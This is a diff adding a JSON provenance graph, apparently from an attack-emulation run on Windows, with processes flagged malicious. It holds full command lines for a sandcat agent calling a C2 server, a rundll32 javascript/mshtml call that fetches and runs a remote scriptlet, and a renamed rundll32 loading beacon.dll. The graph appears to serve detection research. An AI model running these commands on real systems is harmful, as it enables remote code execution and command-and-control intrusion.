@@ -1,0 +1,301 @@
+{
+  "nodes": [
+    {
+      "id": "Network:13711c60df00c535",
+      "type": "Network",
+      "properties": {
+        "type": "IP",
+        "address": "10.0.1.12"
+      }
+    },
+    {
+      "id": "Network:d03cd847ac3133a8",
+      "type": "Network",
+      "properties": {
+        "type": "URL",
+        "address": "http://10.0.1.12:8888"
+      }
+    },
+    {
+      "id": "Process:sandcat|3cba7b39",
+      "type": "Process",
+      "properties": {
+        "label": "sandcat",
+        "image": "%USER%\\sandcat.exe",
+        "command_line": "\"C:\\Users\\Public\\sandcat.exe\" -server http://10.0.1.12:8888 -group my_group -v",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{9014E149-044E-5FC5-2300-000000009101}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:powershell|63710f57",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{9014E149-0449-5FC5-1800-000000009101}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:3cba7b39",
+      "type": "File",
+      "properties": {
+        "path": "%USER%\\sandcat.exe",
+        "path_normalized": "c:\\users\\[user]\\sandcat.exe"
+      }
+    },
+    {
+      "id": "Process:cmd|85463a0e",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{9014E149-04A8-5FC5-DF00-000000009101}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:winrshost|c19cee50",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{9014E149-04A8-5FC5-DD00-000000009101}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:rundll32|dffe0816",
+      "type": "Process",
+      "properties": {
+        "label": "rundll32",
+        "image": "%WINDIR%\\System32\\rundll32.exe",
+        "command_line": "rundll32.exe  javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec(); ",
+        "parent_image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{9014E149-04AA-5FC5-EB00-000000009101}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Network:147b8bcc803e837b",
+      "type": "Network",
+      "properties": {
+        "type": "URL",
+        "address": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"
+      }
+    },
+    {
+      "id": "Network:b1e556680ab801e5",
+      "type": "Network",
+      "properties": {
+        "address": "151.101.12.133",
+        "port": "443",
+        "protocol": "tcp"
+      }
+    },
+    {
+      "id": "Network:69dbe813b7be18f3",
+      "type": "Network",
+      "properties": {
+        "address": "93.184.220.29",
+        "port": "80",
+        "protocol": "tcp"
+      }
+    },
+    {
+      "id": "Registry:b23a6a84",
+      "type": "Registry",
+      "properties": {
+        "path": "HKLM\\System\\CurrentControlSet\\Services\\npf\\ImagePath"
+      }
+    },
+    {
+      "id": "Process:explorer|536d9349",
+      "type": "Process",
+      "properties": {
+        "label": "explorer",
+        "image": "%WINDIR%\\explorer.exe",
+        "guid": "{D700CDCA-8E14-6021-A97C-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Network:14a01f915c7ec024",
+      "type": "Network",
+      "properties": {
+        "address": "10.0.1.16",
+        "port": "80",
+        "protocol": "tcp"
+      }
+    },
+    {
+      "id": "Process:notrundll32|63deaf5b",
+      "type": "Process",
+      "properties": {
+        "label": "notrundll32",
+        "image": "C:\\Temp\\notrundll32.exe",
+        "command_line": "c:\\temp\\notrundll32.exe  C:\\payloads\\beacon.dll,Start",
+        "parent_image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{D700CDCA-C082-6022-A8A1-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:powershell_ise|c1fbc4c1",
+      "type": "Process",
+      "properties": {
+        "label": "powershell_ise",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
+        "guid": "{D700CDCA-9959-6021-267E-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:ab402de6",
+      "type": "File",
+      "properties": {
+        "path": "%USER%\\AppData\\Local\\Microsoft_Corporation\\PowerShell_ISE.exe_StrongName_lw2v2vm3wmtzzpebq33gybmeoxukb04w\\3.0.0.0\\AutoSaveInformation\\6892.xml~RF1435672c.TMP",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\microsoft_corporation\\powershell_ise.exe_strongname_lw2v2vm3wmtzzpebq33gybmeoxukb04w\\3.0.0.0\\autosaveinformation\\6892.xml~rf1435672c.tmp"
+      }
+    },
+    {
+      "id": "File:c9dbb754",
+      "type": "File",
+      "properties": {
+        "path": "%USER%\\AppData\\Local\\Microsoft_Corporation\\PowerShell_ISE.exe_StrongName_lw2v2vm3wmtzzpebq33gybmeoxukb04w\\3.0.0.0\\AutoSaveInformation\\6892.xml~RF146fff3c.TMP",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\microsoft_corporation\\powershell_ise.exe_strongname_lw2v2vm3wmtzzpebq33gybmeoxukb04w\\3.0.0.0\\autosaveinformation\\6892.xml~rf146fff3c.tmp"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "source": "Process:powershell|63710f57",
+      "target": "Process:sandcat|3cba7b39",
+      "operations": []
+    },
+    {
+      "source": "Process:sandcat|3cba7b39",
+      "target": "Network:13711c60df00c535",
+      "operations": []
+    },
+    {
+      "source": "Process:sandcat|3cba7b39",
+      "target": "Network:d03cd847ac3133a8",
+      "operations": []
+    },
+    {
+      "source": "Process:powershell|63710f57",
+      "target": "File:3cba7b39",
+      "operations": []
+    },
+    {
+      "source": "Process:powershell|63710f57",
+      "target": "Process:powershell|63710f57",
+      "operations": []
+    },
+    {
+      "source": "Process:cmd|85463a0e",
+      "target": "Process:powershell|63710f57",
+      "operations": []
+    },
+    {
+      "source": "Process:winrshost|c19cee50",
+      "target": "Process:cmd|85463a0e",
+      "operations": []
+    },
+    {
+      "source": "Process:cmd|85463a0e",
+      "target": "Process:rundll32|dffe0816",
+      "operations": []
+    },
+    {
+      "source": "Process:rundll32|dffe0816",
+      "target": "Network:147b8bcc803e837b",
+      "operations": []
+    },
+    {
+      "source": "Process:powershell|63710f57",
+      "target": "Process:cmd|85463a0e",
+      "operations": []
+    },
+    {
+      "source": "Process:cmd|85463a0e",
+      "target": "Network:147b8bcc803e837b",
+      "operations": []
+    },
+    {
+      "source": "Process:rundll32|dffe0816",
+      "target": "Network:b1e556680ab801e5",
+      "operations": []
+    },
+    {
+      "source": "Process:rundll32|dffe0816",
+      "target": "Network:69dbe813b7be18f3",
+      "operations": []
+    },
+    {
+      "source": "Process:explorer|536d9349",
+      "target": "Process:powershell|63710f57",
+      "operations": []
+    },
+    {
+      "source": "Process:rundll32|dffe0816",
+      "target": "Network:14a01f915c7ec024",
+      "operations": []
+    },
+    {
+      "source": "Process:cmd|85463a0e",
+      "target": "Process:notrundll32|63deaf5b",
+      "operations": []
+    },
+    {
+      "source": "Process:powershell_ise|c1fbc4c1",
+      "target": "Process:cmd|85463a0e",
+      "operations": []
+    },
+    {
+      "source": "Process:notrundll32|63deaf5b",
+      "target": "Network:14a01f915c7ec024",
+      "operations": []
+    },
+    {
+      "source": "Process:cmd|85463a0e",
+      "target": "Process:cmd|85463a0e",
+      "operations": []
+    },
+    {
+      "source": "Process:powershell_ise|c1fbc4c1",
+      "target": "File:ab402de6",
+      "operations": []
+    },
+    {
+      "source": "Process:explorer|536d9349",
+      "target": "Process:cmd|85463a0e",
+      "operations": []
+    },
+    {
+      "source": "Process:powershell_ise|c1fbc4c1",
+      "target": "File:c9dbb754",
+      "operations": []
+    },
+    {
+      "source": "Process:rundll32|dffe0816",
+      "target": "Process:rundll32|dffe0816",
+      "operations": []
+    }
+  ],
+  "metadata": {
+    "version": "v3.0-aggregated",
+    "aggregation_stats": {
+      "original_nodes": 58,
+      "original_edges": 60,
+      "removed_noise_nodes": 0,
+      "removed_noise_edges": 0,
+      "merged_nodes": 40,
+      "final_nodes": 18,
+      "final_edges": 23
+    }
+  }
+}
